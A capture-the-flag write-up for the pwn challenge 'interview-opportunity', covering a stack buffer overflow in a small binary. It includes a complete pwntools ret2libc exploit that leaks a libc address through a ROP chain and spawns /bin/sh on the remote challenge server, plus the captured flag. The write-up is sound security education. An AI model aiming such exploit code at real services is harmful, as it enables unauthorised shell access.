# pwn/interview-opportunity

## Description

Good luck on your interview...

Downloads:
[interview-opportunity](interview-opportunity) [libc.so.6](libc.so.6)

## Solution

For this challenge we are given a binary as well as a remote service. First, I checked the security settings of the
binary:

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

Then I took a look in ghidra:

```c
int main(int argc, char** argv) {
  char application [10];
  
  printf("Thank you for you interest in applying to DiceGang. We need great pwners like you to contin ue our traditions and competition against perfect blue.\n");
  printf("So tell us. Why should you join DiceGang?\n");

  read(0,application,70);
  puts("Hello: ");
  puts(application);

  return 0;
}
```

Clearly, we do have a buffer overflow. All we need now is to find the relevant offset and then we can exploit by first
leaking a libc address and then calling `system`.

```python
#!/usr/bin/python
from pwn import *

context.arch = 'amd64'

exe = 'interview'
elf = ELF(exe)
libc = ELF('libc')

with log.progress("Finding offset"):
    p = process(exe)
    p.recvuntil(b'DiceGang?\n')
    
    payload = cyclic(300)
    p.sendline(payload)
    p.wait()
    
    core = p.corefile
    offset = cyclic_find(p64(core.fault_addr))

p = remote('mc.ax', 31081)
p.recvuntil(b'DiceGang?\n')

with log.progress("Finding libc base"):
    rop = ROP(elf)
    rop.puts(elf.got['puts'])
    rop.main()
    
    p.sendline(fit({ offset: rop.chain()}))
    p.recvline()

    leak = p.recvuntil(b'Thank')
    leak = leak[leak.find(b'\n') + 1 : leak.find(b'Thank') - 1]
    leak = u64(leak.ljust(8, b'\x00'))
    
    libc.address = leak - libc.sym['puts']
    log.info(hex(libc.address))

with log.progress("Getting flag"):
    rop = ROP(libc)
    rop.system(next(libc.search(b'/bin/sh')))
    
    p.recv()
    p.sendline(fit({ offset: rop.chain() }))
    p.interactive()
```

Running the above gives the flag `dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}`.

